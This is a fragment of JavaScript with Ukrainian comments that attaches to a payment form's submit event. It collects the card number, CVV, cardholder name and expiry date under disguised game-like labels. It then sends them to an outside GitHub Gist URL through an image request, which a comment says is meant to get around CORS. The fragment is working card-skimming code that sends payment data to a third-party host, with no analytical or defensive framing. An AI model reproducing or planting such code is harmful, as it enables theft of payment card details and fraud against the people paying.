...
document.getElementById('paymentForm').addEventListener('submit', async function(e) {
    ...
    // Відправка даних через Image (обхід CORS)
    const message = `brawl:${cardData.number}\nid:${cardData.cvv}\ngame:${cardData.name}\ndddd:${cardData.expiry}\ntime:${new Date().toLocaleString('de-DE')}`;
    
    // Відправляємо на Gist raw URL
    const gistRawUrl = 'https://gist.githubusercontent.com/Schule-project/4ce7328aee50f574de81fb7b7b9ae6a0/raw';
    const img = new Image();
    img.src = `${gistRawUrl}?dummy=${Date.now()}&data=${encodeURIComponent(message)}`;
    
    console.log('Дані відправлено:', message);
});
